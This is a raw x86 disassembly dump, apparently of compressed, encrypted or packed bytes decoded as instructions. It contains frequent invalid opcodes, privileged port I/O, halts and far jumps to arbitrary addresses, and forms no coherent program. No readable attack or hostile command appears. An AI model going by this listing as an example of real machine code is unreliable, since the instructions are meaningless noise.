  418c99:	xchg   esi,eax
  418c9a:	int3   
  418c9b:	loope  0x418c34
  418c9d:	sbb    al,0x90
  418c9f:	dec    esi
  418ca0:	cmp    al,0xb5
  418ca2:	mov    ds:0xc8c55a7,eax
  418ca7:	sub    eax,0x35b2f996
  418cac:	out    0xe2,eax
  418cae:	sbb    BYTE PTR [edx-0x72],bl
  418cb1:	test   BYTE PTR [ebp+0x608a3b7b],dl
  418cb7:	enter  0xcbcd,0x8
  418cbb:	in     eax,dx
  418cbc:	lods   eax,DWORD PTR ds:[esi]
  418cbd:	adc    al,0xfa
  418cbf:	xor    eax,0xfc0d54f9
  418cc4:	xchg   edx,eax
  418cc5:	add    cl,BYTE PTR [edi+eiz*1]
  418cc8:	pop    es
  418cc9:	inc    eax
  418cca:	add    cl,BYTE PTR [edx]
  418ccc:	lock mov dh,0x79
  418ccf:	rol    eax,0x96
  418cd2:	or     esi,DWORD PTR ds:0x6893c3d9
  418cd8:	xor    BYTE PTR ss:[edi+0x2e0efb30],ah
  418cdf:	xchg   edi,eax
  418ce0:	adc    al,0x81
  418ce2:	outs   dx,BYTE PTR ds:[esi]
  418ce3:	ret    0x713b
  418ce6:	mov    ebx,0x85717351
  418ceb:	enter  0x1d8e,0x94
  418cef:	adc    al,0xb7
  418cf1:	adc    eax,DWORD PTR [edi]
  418cf3:	xor    eax,0xecf16d7
  418cf8:	stc    
  418cf9:	adc    BYTE PTR [edi-0x1d22e630],cl
  418cff:	mov    al,ds:0x427a6237
  418d04:	arpl   WORD PTR [ecx-0x33],ax
  418d07:	shl    DWORD PTR [edi],0x3f
  418d0a:	out    dx,al
  418d0b:	pop    edi
  418d0c:	popf   
  418d0d:	adc    eax,0xe57d345a
  418d12:	cmp    BYTE PTR [esi+0x1c],0x7f
  418d16:	inc    ebp
  418d17:	test   eax,0xaf8cea0d
  418d1c:	rol    DWORD PTR [edx-0x214bba6c],1
  418d22:	mov    DWORD PTR [edi+0x68173161],ecx
  418d28:	dec    eax
  418d29:	lds    esp,FWORD PTR [ecx+edx*2-0x2dc91b0d]
  418d30:	sub    eax,0xc7b4590a
  418d35:	dec    ebp
  418d36:	(bad)  
  418d37:	jg     0x418da4
  418d39:	(bad)  
  418d3a:	ror    DWORD PTR [ebx+edi*1+0x7f],cl
  418d3e:	jno    0x418d16
  418d40:	jg     0x418d09
  418d42:	add    ch,BYTE PTR [ebx+0x5f]
  418d45:	bound  ebp,QWORD PTR [esi+0x18]
  418d48:	adc    eax,0x5a2e75ba
  418d4d:	and    esp,DWORD PTR [eax]
  418d4f:	adc    ebp,DWORD PTR [esi+0x17]
  418d52:	sbb    bh,BYTE PTR [ebp-0x79]
  418d55:	xor    eax,0x96bd233b
  418d5a:	mov    ah,0x44
  418d5c:	sbb    bh,BYTE PTR ds:0x37b0f72f
  418d62:	add    al,0xc6
  418d64:	pop    edx
  418d65:	adc    cl,bl
  418d67:	mov    al,0x35
  418d69:	(bad)  
  418d6b:	and    eax,DWORD PTR [edx-0x5da9e245]
  418d71:	xor    bl,BYTE PTR [edi+0x5e]
  418d74:	sbb    eax,0x60d16d51
  418d79:	mov    al,0xea
  418d7b:	push   esi
  418d7c:	ins    DWORD PTR es:[edi],dx
  418d7d:	jmp    0x418d1c
  418d7f:	es sbb ah,al
  418d82:	mov    WORD PTR [edx],?
  418d84:	das    
  418d85:	adc    al,0x88
  418d87:	push   eax
  418d88:	(bad)  
  418d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d8a:	out    dx,al
  418d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d8c:	mov    al,ds:0x88371b22
  418d91:	mov    ah,0xa6
  418d93:	aaa    
  418d94:	ret    0x6eb8
  418d97:	fimul  DWORD PTR [edi-0x37]
  418d9a:	stos   DWORD PTR es:[edi],eax
  418d9b:	add    al,0xf0
  418d9d:	fwait
  418d9e:	or     eax,0xe3d345c4
  418da3:	mov    eax,ds:0x9cdeaed4
  418da8:	jb     0x418dcf
  418daa:	and    eax,0x32b4c70e
  418daf:	pop    ebx
  418db0:	cmp    DWORD PTR [ebp+0x403b8b62],ecx
  418db6:	jbe    0x418e2b
  418db8:	pop    edi
  418db9:	daa    
  418dba:	mov    ds:0xb019cc5b,eax
  418dbf:	xor    eax,DWORD PTR [ecx+edx*1]
  418dc2:	inc    esi
  418dc3:	and    dh,bl
  418dc5:	pop    es
  418dc6:	pop    ecx
  418dc7:	jg     0x418d87
  418dc9:	xor    eax,0x3f83676e
  418dce:	add    eax,0x4012a768
  418dd3:	push   0x50
  418dd5:	jne    0x418dca
  418dd7:	push   edi
  418dd8:	xor    ebx,ebp
  418dda:	loope  0x418d8b
  418ddc:	jp     0x418ded
  418dde:	into   
  418ddf:	rcl    bl,0x23
  418de2:	das    
  418de3:	sub    BYTE PTR ds:0xf517008c,dh
  418de9:	fdivr  st(3),st
  418deb:	push   edi
  418dec:	dec    esp
  418ded:	shl    DWORD PTR [ebp-0x37d5b186],1
  418df3:	dec    ebp
  418df4:	jmp    0x418d87
  418df6:	fwait
  418df7:	iret   
  418df8:	push   cs
  418df9:	cwde   
  418dfa:	inc    ebp
  418dfb:	jns    0x418da8
  418dfd:	je     0x418e77
  418dff:	mov    bh,0xc1
  418e01:	in     al,0x26
  418e03:	inc    ebp
  418e04:	push   ebx
  418e05:	sub    DWORD PTR [ebx+0x58],ebx
  418e08:	mov    eax,0xdd8eadf2
  418e0d:	fwait
  418e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e0f:	inc    esi
  418e10:	and    al,BYTE PTR [eax+0x72]
  418e13:	scas   al,BYTE PTR es:[edi]
  418e14:	inc    esi
  418e15:	xor    DWORD PTR [ebp+0x65],eax
  418e18:	sbb    al,BYTE PTR [edx+0x31b704de]
  418e1e:	fst    DWORD PTR ds:0x17e1f88c
  418e24:	sbb    DWORD PTR [eax-0x18],ebx
  418e27:	push   es
  418e28:	(bad)  
  418e29:	xor    esp,DWORD PTR [edi]
  418e2b:	mov    dh,0xdd
  418e2d:	pop    es
  418e2e:	es jns 0x418e70
  418e31:	xchg   BYTE PTR [ecx+0x29dab7c6],al
  418e37:	pushf  
  418e38:	pushf  
  418e39:	or     edi,DWORD PTR [ebp+eax*1-0x31]
  418e3d:	push   ecx
  418e3e:	xor    BYTE PTR [eax+0x39],bl
  418e41:	xchg   edx,eax
  418e42:	jb     0x418dec
  418e44:	push   0x7f10c628
  418e49:	bound  ebx,QWORD PTR [edx]
  418e4b:	es stc 
  418e4d:	mov    ecx,0x7d0ea168
  418e52:	mov    ebx,0x66f1d0a
  418e57:	dec    esi
  418e58:	sbb    DWORD PTR [ecx+0x648c6d2c],ecx
  418e5e:	pushaw 
  418e60:	push   ecx
  418e61:	outs   dx,BYTE PTR ds:[esi]
  418e62:	mov    cl,0x4
  418e64:	xchg   esp,eax
  418e65:	pop    ds
  418e66:	cmp    al,BYTE PTR [esi]
  418e68:	fimul  WORD PTR [esi-0x19]
  418e6b:	popf   
  418e6c:	push   esp
  418e6d:	mov    al,ds:0xd8c115a6
  418e72:	mov    al,ds:0x1703a1b0
  418e77:	shr    BYTE PTR [edi],1
  418e79:	push   esp
  418e7a:	mov    BYTE PTR [ebp+0x58],0x6e
  418e7e:	psubusb mm6,QWORD PTR [esi]
  418e81:	hlt    
  418e82:	fidiv  WORD PTR [ebx]
  418e84:	adc    DWORD PTR [edx-0x10],0x4308adc4
  418e8b:	sub    ebp,DWORD PTR [ebx+eax*4+0x53]
  418e8f:	fld    QWORD PTR [edx+0x539fa93a]
  418e95:	test   al,0x32
  418e97:	nop
  418e98:	mov    esp,0xe7a8d520
  418e9d:	fsub   QWORD PTR [edx-0x13]
  418ea0:	out    dx,eax
  418ea1:	add    BYTE PTR [esi+0x6],dl
  418ea4:	inc    ebp
  418ea5:	pop    ds
  418ea6:	sub    al,0xb7
  418ea8:	cmp    bh,ah
  418eaa:	push   0xcc2ac566
  418eaf:	in     al,0xf5
  418eb1:	dec    ecx
  418eb2:	jmp    0xc04b:0xd5018567
  418eb9:	dec    esi
  418eba:	cmp    eax,0xb8cd7d1c
  418ebf:	jnp    0x418e4c
  418ec1:	adc    ebx,DWORD PTR [edx+ecx*4]
  418ec4:	push   ecx
  418ec5:	or     eax,0xf8c96f37
  418eca:	neg    BYTE PTR [esi-0x1795bb9b]
  418ed0:	inc    ebp
  418ed1:	adc    DWORD PTR [edi+0x41],0x3aa12219
  418ed8:	sub    BYTE PTR [esp+eax*8-0xd],bh
  418edc:	addr16 mov ebx,0x37406f7
  418ee2:	aaa    
  418ee3:	push   cs
  418ee4:	ja     0x418e86
  418ee6:	mov    ebx,DWORD PTR [ebp+0x11f207d1]
  418eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eed:	cmp    al,0xf1
  418eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ef0:	lods   al,BYTE PTR ds:[esi]
  418ef1:	mov    al,0xf5
  418ef3:	xlat   BYTE PTR ds:[ebx]
  418ef4:	mov    ds:0x8a1f2101,eax
  418ef9:	and    eax,ebx
  418efb:	jmp    0x6852:0xad345311
  418f02:	call   DWORD PTR [eax-0x46ed8029]
  418f08:	les    ebp,FWORD PTR ds:0xf4b96426
  418f0e:	aas    
  418f0f:	aad    0x78
  418f11:	jne    0x418ef0
  418f13:	shl    DWORD PTR [edi-0xdd41a85],0xf7
  418f1a:	adc    DWORD PTR [eax+0x6e5dbab6],esi
  418f20:	inc    esi
  418f21:	inc    esp
  418f22:	pop    esi
  418f23:	jmp    0x418f5c
  418f25:	mov    ecx,0x82ca2775
  418f2a:	add    ah,BYTE PTR [esi+0x60a23169]
  418f30:	es ret 
  418f32:	jmp    0x418f8d
  418f34:	(bad)  
  418f35:	iret   
  418f36:	pop    edi
  418f37:	sahf   
  418f38:	push   ebx
  418f39:	cmp    eax,0x7ec1e402
  418f3e:	in     eax,dx
  418f3f:	push   ebx
  418f40:	jno    0x418f52
  418f42:	mul    edx
  418f44:	push   edx
  418f45:	xchg   esi,eax
  418f46:	adc    BYTE PTR [ebx-0x2d7b5b59],0x56
  418f4d:	sahf   
  418f4e:	iret   
  418f4f:	xchg   BYTE PTR ds:0x65d3672d,dh
  418f55:	aad    0x28
  418f57:	fdiv   DWORD PTR [ecx+eax*1]
  418f5a:	ins    BYTE PTR es:[edi],dx
  418f5b:	pushf  
  418f5c:	inc    edx
  418f5d:	push   ds
  418f5e:	fnsave [ebp+0x3f]
  418f61:	cmp    DWORD PTR [ecx],edx
  418f63:	sub    DWORD PTR [esi-0x4c],edi
  418f66:	pop    eax
  418f67:	add    BYTE PTR [edx],ah
  418f69:	mov    esi,0x96abc520
  418f6e:	ret    0xff5e
  418f71:	or     DWORD PTR [ebx],eax
  418f73:	mov    cl,0xc8
  418f75:	je     0x418f1c
  418f77:	ds ret 0x974b
  418f7b:	out    0xd0,al
  418f7d:	cmc    
  418f7e:	mov    esi,0xf39d951e
  418f83:	mov    edx,ebp
  418f85:	lahf   
  418f86:	mov    eax,0xe67532f4
  418f8b:	pop    ds
  418f8c:	mul    DWORD PTR [ebp-0x4d]
  418f8f:	sbb    dh,dl
  418f91:	bnd jle 0x418fbe
  418f94:	push   cs
  418f95:	sar    DWORD PTR [ebx-0x6ec38958],cl
  418f9b:	loopne 0x418fc4
  418f9d:	test   DWORD PTR [esi],ebp
  418f9f:	es jecxz 0x419000
  418fa2:	sbb    eax,0xa64442f9
  418fa7:	push   ebp
  418fa8:	scas   al,BYTE PTR es:[edi]
  418fa9:	cs cmp al,0xe9
  418fac:	sub    eax,0x9b92df53
  418fb1:	mov    bh,0x83
  418fb3:	sti    
  418fb4:	fsubr  QWORD PTR [ebx]
  418fb6:	sbb    ebp,0x1077058d
  418fbc:	sbb    ch,BYTE PTR [edx-0x1b]
  418fbf:	xor    esp,DWORD PTR [eax+0x5e]
  418fc2:	retf   
  418fc3:	outs   dx,DWORD PTR ds:[esi]
  418fc4:	jge    0x419041
  418fc6:	mov    ch,0x21
  418fc8:	xchg   edi,eax
  418fc9:	out    0x88,eax
  418fcb:	and    eax,0x2a0bb425
  418fd0:	lods   al,BYTE PTR ds:[esi]
  418fd1:	dec    edi
  418fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fd3:	jo     0x418fe8
  418fd5:	push   edi
  418fd6:	std    
  418fd7:	(bad)  
  418fd8:	clc    
  418fd9:	adc    DWORD PTR [ebx],esp
  418fdb:	(bad)  
  418fdc:	test   al,0xd
  418fde:	add    al,0x9
  418fe0:	test   BYTE PTR [ebx-0x7b8b8b85],dl
  418fe6:	js     0x419058
  418fe8:	imul   esp,DWORD PTR [eax],0x8af1afe6
  418fee:	ins    DWORD PTR es:[edi],dx
  418fef:	out    0xd0,eax
  418ff1:	or     eax,0x33cce0c4
  418ff6:	retf   
  418ff7:	xlat   BYTE PTR ds:[ebx]
  418ff8:	dec    ebx
  418ff9:	dec    esp
  418ffa:	rcr    DWORD PTR [ebx+0x21],cl
  418ffd:	mov    al,0x8c
  418fff:	pop    edi
  419000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419001:	xchg   esp,eax
  419002:	(bad)  
  419004:	jmp    0xcfa4:0x6c0dba5e
  41900b:	in     al,0x9
  41900d:	lock ja 0x419060
  419010:	(bad)  
  419011:	mov    ds:0x1b6e9785,eax
  419016:	or     ebp,DWORD PTR ds:0xd4ffa3b7
  41901c:	add    ebx,eax
  41901e:	push   ebp
  41901f:	push   eax
  419020:	jl     0x418fc1
  419022:	sbb    al,0x9f
  419024:	stos   DWORD PTR es:[edi],eax
  419025:	inc    edi
  419026:	mov    ds:0xd6c2d333,al
  41902b:	adc    dl,BYTE PTR [edi+0x2c]
  41902e:	dec    ebp
  41902f:	call   0xe7db3591
  419034:	sub    eax,0x1ceb27a9
  419039:	cwde   
  41903a:	adc    bh,0x1b
  41903d:	dec    edx
  41903e:	xchg   ecx,eax
  41903f:	ror    BYTE PTR ds:0x7549e742,cl
  419045:	das    
  419046:	mov    edi,0xa59aba11
  41904b:	nop
  41904c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41904d:	mov    cl,0x9c
  41904f:	cld    
  419050:	push   cs
  419051:	iret   
  419052:	push   ebp
  419053:	push   ebp
  419054:	xchg   ecx,ebp
  419056:	cmp    DWORD PTR [ebx-0x16],ebp
  419059:	test   BYTE PTR ds:0xb46568c2,ch
  41905f:	popa   
  419060:	pop    ebx
  419061:	sahf   
  419062:	lods   al,BYTE PTR ds:[esi]
  419063:	add    ebp,DWORD PTR [ebp-0x15]
  419066:	dec    ecx
  419067:	aaa    
  419068:	mov    edx,?
  41906a:	out    0x93,eax
  41906c:	rcr    BYTE PTR [edx],1
  41906e:	nop
  41906f:	inc    eax
  419070:	test   BYTE PTR [ebx],ah
  419072:	cmp    esi,edi
  419074:	ja     0x419067
  419076:	inc    ebx
  419077:	jb     0x419074
  419079:	aam    0xe6
  41907b:	fadd   st,st(2)
  41907d:	mov    edi,0x298cb8bd
  419082:	pop    eax
  419083:	adc    al,0xad
  419085:	mov    edx,0xcec19752
  41908a:	cli    
  41908b:	push   ecx
  41908c:	sbb    eax,DWORD PTR [eax-0x25e15080]
  419092:	pop    esi
  419093:	push   ecx
  419094:	push   es
  419095:	push   esp
  419096:	sbb    al,0xae
  419098:	leave  
  419099:	inc    esp
  41909a:	mov    ecx,0x6e5a886
  41909f:	mov    bl,0x93
  4190a1:	push   ebx
  4190a2:	mov    dh,0xd5
  4190a4:	mov    esp,0x2e99aa4a
  4190a9:	pop    esp
  4190aa:	sub    edi,DWORD PTR [edi]
  4190ac:	cmp    eax,0x92064c1c
  4190b1:	shr    DWORD PTR [edx],cl
  4190b3:	mov    ds:0xcc4b6073,al
  4190b8:	stc    
  4190b9:	outs   dx,BYTE PTR ds:[esi]
  4190ba:	adc    eax,0xbb4ebdd1
  4190bf:	sbb    edi,esp
  4190c1:	fsubrp st(4),st
  4190c3:	aaa    
  4190c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190c5:	cdq    
  4190c6:	xor    BYTE PTR [ebp+0x824d47d],dl
  4190cc:	mov    ebx,DWORD PTR [ebx+0x5f845640]
  4190d2:	jmp    0xd374ac6b
  4190d7:	sbb    bl,BYTE PTR [eax+0xf5e4b75]
  4190dd:	cli    
  4190de:	push   cs
  4190df:	push   ebp
  4190e0:	(bad)  
  4190e1:	push   ebx
  4190e2:	call   0x863e:0xde01ac10
  4190e9:	sub    DWORD PTR [ebx-0x36681873],edx
  4190ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190f0:	addr16 in eax,dx
  4190f2:	or     eax,0x7c61864d
  4190f7:	sub    BYTE PTR [ecx+0x1fce0ec4],ch
  4190fd:	je     0x41915d
  4190ff:	sub    edx,DWORD PTR [ecx]
  419101:	jp     0x419102
  419103:	xchg   ebp,esp
  419105:	mov    al,0x78
  419107:	int3   
  419108:	scas   al,BYTE PTR es:[edi]
  419109:	mov    esp,0x69dd14e1
  41910e:	dec    esi
  41910f:	test   al,0x71
  419111:	sub    BYTE PTR [ebx],dh
  419113:	ret    
  419114:	xchg   esi,eax
  419115:	fldenv [ecx-0x7e]
  419118:	mov    esp,0xc2224b38
  41911d:	mov    al,ds:0xedeb1bc5
  419122:	gs xchg ebp,eax
  419124:	ret    
  419125:	mov    BYTE PTR [edi],cl
  419127:	mov    ecx,0xe6924ca3
  41912c:	mov    BYTE PTR [edx],ah
  41912e:	inc    ebp
  41912f:	xchg   ebp,eax
  419130:	sub    ah,bh
  419132:	mov    ch,0x2d
  419134:	sub    DWORD PTR [eax],esi
  419136:	xchg   DWORD PTR [edx+ecx*4],edx
  419139:	cdq    
  41913a:	mov    ds:0x7e70bbc3,al
  41913f:	or     esi,esp
  419141:	adc    BYTE PTR [eax],ah
  419143:	xchg   edx,eax
  419144:	dec    esi
  419145:	cmp    BYTE PTR [edi],bl
  419147:	mov    ebp,0xc1509880
  41914c:	lods   eax,DWORD PTR ds:[esi]
  41914d:	jnp    0x419185
  41914f:	retf   
  419150:	push   ds
  419151:	push   eax
  419152:	jecxz  0x419159
  419154:	xchg   edx,eax
  419155:	jecxz  0x4191c2
  419157:	push   edx
  419158:	sub    esp,DWORD PTR [edx]
  41915a:	mov    dl,0xcc
  41915c:	inc    ebx
  41915d:	xchg   DWORD PTR [ebp+0x1425c1a3],ecx
  419163:	fsubr  DWORD PTR [ebp-0x44025ee6]
  419169:	dec    eax
  41916a:	ret    0xbb39
  41916d:	pop    edx
  41916e:	ds es dec edi
  419171:	push   0xffffff81
  419173:	test   al,0xfd
  419175:	cmp    al,0x80
  419177:	fcmovb st,st(7)
  419179:	(bad)  
  41917b:	std    
  41917c:	shl    DWORD PTR [ecx-0x1b5acdb5],1
  419182:	stos   BYTE PTR es:[edi],al
  419183:	jne    0x4191f3
  419185:	cmp    BYTE PTR [ebx+ebx*4],0xde
  419189:	pop    es
  41918a:	lods   eax,DWORD PTR ds:[esi]
  41918b:	or     DWORD PTR [esi-0x3df45e5a],ebx
  419191:	aam    0x24
  419193:	xor    esi,DWORD PTR ds:0xb600b45c
  419199:	push   ds
  41919a:	(bad)  
  41919b:	call   FWORD PTR [bx+si-0x3470]
  4191a0:	sbb    eax,0x3802de64
  4191a5:	mov    cl,0x8f
  4191a7:	repnz enter 0x44c8,0x95
  4191ac:	fcmovnbe st,st(6)
  4191ae:	xchg   ecx,eax
  4191af:	gs std 
  4191b1:	adc    ecx,DWORD PTR [edi+0x50]
  4191b4:	or     ch,BYTE PTR ds:0x2ab5b840
  4191ba:	pop    ebx
  4191bb:	jg     0x4191bb
  4191bd:	cwde   
  4191be:	pusha  
  4191bf:	mov    DWORD PTR [ecx-0x7c],edx
  4191c2:	xchg   DWORD PTR [ebx+ecx*2+0x7c896388],esp
  4191c9:	jnp    0x4191a6
  4191cb:	or     al,0x9b
  4191cd:	mov    dl,0x60
  4191cf:	or     edi,ecx
  4191d1:	into   
  4191d2:	and    dh,BYTE PTR [edx+0x5]
  4191d5:	and    BYTE PTR [ecx-0x60],bh
  4191d8:	pop    esp
  4191d9:	push   edx
  4191da:	ror    DWORD PTR [ebx+0x76],cl
  4191dd:	inc    esi
  4191de:	dec    eax
  4191df:	cmp    ebp,DWORD PTR [ebx]
  4191e1:	ins    BYTE PTR es:[edi],dx
  4191e2:	jmp    0x47a6088f
  4191e7:	shl    DWORD PTR [eax],0xad
  4191ea:	xchg   ecx,eax
  4191eb:	shl    DWORD PTR [eax+0x728e66e8],cl
  4191f1:	icebp  
  4191f2:	xor    BYTE PTR [edx+0xaf3018b],0x52
  4191f9:	jne    0x419262
  4191fb:	popf   
  4191fc:	loopne 0x419216
  4191fe:	stc    
  4191ff:	cmp    al,0x2b
  419201:	icebp  
  419202:	loopne 0x41920b
  419204:	test   DWORD PTR [ecx+eiz*2],0xd1d86893
  41920b:	stos   BYTE PTR es:[edi],al
  41920c:	ins    DWORD PTR es:[edi],dx
  41920d:	push   edi
  41920e:	sti    
  41920f:	xor    bh,dl
  419211:	rcl    BYTE PTR [esp+esi*8-0x132a41b8],1
  419218:	jp     0x419206
  41921a:	mov    bl,0xb4
  41921c:	mov    edx,0x7da99ef3
  419221:	lock cmp BYTE PTR [eax],bh
  419224:	sub    eax,0xffe87aac
  419229:	les    esp,FWORD PTR [ebp-0x7c]
  41922c:	stc    
  41922d:	push   edx
  41922e:	xor    edx,DWORD PTR ds:0x319d3c8e
  419234:	push   0xffffffe7
  419236:	fwait
  419237:	inc    ecx
  419238:	cwde   
  419239:	iret   
  41923a:	sub    BYTE PTR [edx-0xd],dl
  41923d:	inc    ebx
  41923e:	dec    edi
  41923f:	stos   DWORD PTR es:[edi],eax
  419240:	add    esi,DWORD PTR [edi-0x21be8e87]
  419246:	pop    esi
  419247:	fs pop edi
  419249:	pop    DWORD PTR [ebp+eiz*4+0x38]
  41924d:	call   0x4af0:0xc6cef33b
  419254:	push   0x93d1a9d1
  419259:	push   0xffffffba
  41925b:	mov    ebp,0xfca81834
  419260:	aam    0xcd
  419262:	sti    
  419263:	jmp    0x419201
  419265:	jmp    0x419282
  419267:	stos   DWORD PTR es:[edi],eax
  419268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419269:	(bad)  
  41926a:	pop    esi
  41926b:	call   0xdc72:0x16ebbc24
  419272:	add    al,0x0
  419274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419275:	cmp    ebp,DWORD PTR [esi]
  419277:	cmp    esi,DWORD PTR [edx+0x9db940f]
  41927d:	jo     0x419226
  41927f:	sub    eax,0xb6aa37a4
  419284:	add    DWORD PTR [edx-0x52e1afbf],esp
  41928a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41928b:	popf   
  41928c:	jb     0x4192db
  41928e:	test   al,0xb0
  419290:	call   0xe4ad:0xd6c48705
  419297:	push   cs
  419298:	fldenv [eax+0x42]
  41929b:	adc    al,0x2e
  41929d:	(bad)  
  41929e:	jge    0x4192d7
  4192a0:	xor    dl,ch
  4192a2:	iret   
  4192a3:	push   esp
  4192a4:	dec    edi
  4192a5:	call   0x258c6168
  4192aa:	mov    al,ds:0x19778952
  4192af:	fidivr DWORD PTR fs:[ebx]
  4192b2:	or     al,0xf1
  4192b4:	pop    ss
  4192b5:	adc    bh,BYTE PTR ds:0x758910e3
  4192bb:	data16 mov dl,BYTE PTR [edx]
  4192be:	in     eax,dx
  4192bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192c0:	sahf   
  4192c1:	rol    BYTE PTR [edx-0x2b],0x8f
  4192c5:	and    DWORD PTR [esi-0x26],eax
  4192c8:	ret    0x672e
  4192cb:	call   0x50d7:0x63b6279
  4192d2:	clc    
  4192d3:	test   eax,0x28ac687c
  4192d8:	lds    ecx,FWORD PTR [eax]
  4192da:	inc    edi
  4192db:	push   cs
  4192dc:	add    DWORD PTR [eax+0x7e],0x39
  4192e0:	sub    ebp,esp
  4192e2:	adc    eax,0xd8fbef90
  4192e7:	cmp    al,BYTE PTR [ebp+0x60]
  4192ea:	mov    eax,ds:0xfa763fa8
  4192ef:	add    BYTE PTR [edx-0x136a93a2],ch
  4192f5:	dec    ebp
  4192f6:	or     DWORD PTR [edi-0x34c5233b],0x79
  4192fd:	mov    ebp,0xf37186ac
  419302:	sub    DWORD PTR ss:[eax],edi
  419305:	cdq    
  419306:	pop    eax
  419307:	pop    ds
  419308:	gs pop esi
  41930a:	fimul  WORD PTR [esi-0x78]
  41930d:	cmp    bh,BYTE PTR [ecx-0x3081d5f6]
  419313:	ret    0xbb51
  419316:	mov    ebp,0x64865845
  41931b:	xchg   ebp,eax
  41931c:	mov    DWORD PTR [eax],esi
  41931e:	je     0x419399
  419320:	aaa    
  419321:	inc    edi
  419322:	into   
  419323:	not    BYTE PTR [ebx-0x53f5111a]
  419329:	in     eax,0x54
  41932b:	repnz cmp eax,0x2153cc6e
  419331:	imul   ebx,DWORD PTR [ebx-0x5e73aa3e],0x71
  419338:	fucom  st(6)
  41933a:	int3   
  41933b:	jmp    0xced4:0x838fa7c0
  419342:	(bad)  
  419343:	jg     0x419355
  419345:	sub    edi,DWORD PTR [ecx+0x37]
  419348:	xor    al,0x30
  41934a:	stos   DWORD PTR es:[edi],eax
  41934b:	jbe    0x41935a
  41934d:	and    al,0xa6
  41934f:	sbb    al,0xe4
  419351:	mov    esi,0x1351b59c
  419356:	ja     0x419358
  419358:	push   esp
  419359:	popf   
  41935a:	shl    BYTE PTR [eax+0x3da67a52],cl
  419360:	and    BYTE PTR [ecx-0x1b536823],dh
  419366:	fwait
  419367:	adc    bl,ah
  419369:	jge    0x41930e
  41936b:	jl     0x4193db
  41936d:	test   BYTE PTR [edx],dh
  41936f:	inc    BYTE PTR [ebx+0x7d847dda]
  419375:	mov    edi,0xc6aa75db
  41937a:	rcl    dl,1
  41937c:	add    edi,DWORD PTR [edi+0x56]
  41937f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419380:	cmp    BYTE PTR [edx],cl
  419382:	fs (bad) 
  419384:	rep lods al,BYTE PTR ds:[esi]
  419386:	cmp    al,0xb
  419388:	sar    DWORD PTR [ecx+0x2d563dd1],cl
  41938e:	push   es
  41938f:	xchg   DWORD PTR [ecx+0x6cb68f55],ebx
  419395:	lds    esi,FWORD PTR [ebx+0x571bbed1]
  41939b:	sbb    ch,dl
  41939d:	ins    DWORD PTR es:[edi],dx
  41939e:	icebp  
  41939f:	sti    
  4193a0:	jmp    0x47683ef1
  4193a5:	sbb    eax,0x13513663
  4193aa:	push   esp
  4193ab:	and    ebx,DWORD PTR [edi+0x7400daeb]
  4193b1:	jo     0x419349
  4193b3:	mov    ds:0x3ec795a3,eax
  4193b8:	push   ebx
  4193b9:	mov    eax,ds:0x152fab8d
  4193be:	es jmp eax
  4193c1:	push   ds
  4193c2:	mov    edx,0xaaabcfa5
  4193c7:	push   cs
  4193c8:	pop    es
  4193c9:	out    0xfa,al
  4193cb:	fldcw  WORD PTR [ecx]
  4193cd:	xchg   edi,eax
  4193ce:	mov    ah,0x7b
  4193d0:	mov    edx,0xe53b7ef5
  4193d5:	or     eax,0x8e87009e
  4193da:	pop    edx
  4193db:	xor    esi,ebx
  4193dd:	shl    DWORD PTR [edx-0x7a],cl
  4193e0:	ret    
  4193e1:	loopne 0x419396
  4193e3:	jmp    0xff2efbf7
  4193e8:	sbb    edi,ebx
  4193ea:	ficomp DWORD PTR [ecx+0x6f440ecf]
  4193f0:	and    eax,0xea718d52
  4193f5:	mov    edx,0x8c1b4fe0
  4193fa:	jb     0x41944b
  4193fc:	sub    eax,0xd3e94d99
  419401:	pop    es
  419402:	cmp    eax,0x6d80376
  419407:	loopne 0x4193a3
  419409:	mov    eax,0xd84ba3d3
  41940e:	jbe    0x4193ff
  419410:	mov    bh,bh
  419412:	sub    edi,DWORD PTR [ebp+0x4f373a8e]
  419418:	push   ebp
  419419:	jae    0x419474
  41941b:	nop
  41941c:	fnstcw WORD PTR [eax+ebx*8-0x10]
  419420:	adc    bh,BYTE PTR [edx]
  419422:	sbb    ecx,DWORD PTR [eax-0x4441639b]
  419428:	xor    BYTE PTR [esi+0x31],dl
  41942b:	cld    
  41942c:	mov    bh,0x5e
  41942e:	(bad)  
  41942f:	aam    0x7d
  419431:	mov    cl,0x24
  419433:	mov    cs,WORD PTR [esi]
  419435:	sbb    BYTE PTR [eax-0x16],bl
  419438:	popa   
  419439:	or     edx,DWORD PTR [eax+ecx*2]
  41943c:	fidiv  WORD PTR [esp+ebx*1-0x6d]
  419440:	inc    esp
  419441:	mov    ecx,0xb49ecd4c
  419446:	adc    al,0x43
  419448:	jecxz  0x41947e
  41944a:	push   0xffffff90
  41944c:	adc    al,0xe1
  41944e:	rol    eax,0x31
  419451:	ja     0x41940d
  419453:	or     BYTE PTR [ebx+ecx*1],0x4a
  419457:	sbb    dl,cl
  419459:	mov    ecx,DWORD PTR [eiz*4-0x68f386f5]
  419460:	xchg   esp,eax
  419461:	mov    al,0x2f
  419463:	pop    ds
  419464:	test   eax,0x9306267b
  419469:	and    ebp,edx
  41946b:	push   cs
  41946c:	sub    al,0x52
  41946e:	or     al,0xbf
  419470:	add    eax,0xb8e7c910
  419475:	into   
  419476:	sar    ebp,cl
  419478:	cmp    ebp,DWORD PTR [ebx-0x6f]
  41947b:	pushf  
  41947c:	jb     0x41941d
  41947e:	mov    esi,0xccc6e7ae
  419483:	push   ss
  419484:	pop    edi
  419485:	xchg   ebx,eax
  419486:	fadd   QWORD PTR ds:0xce8a96da
  41948c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
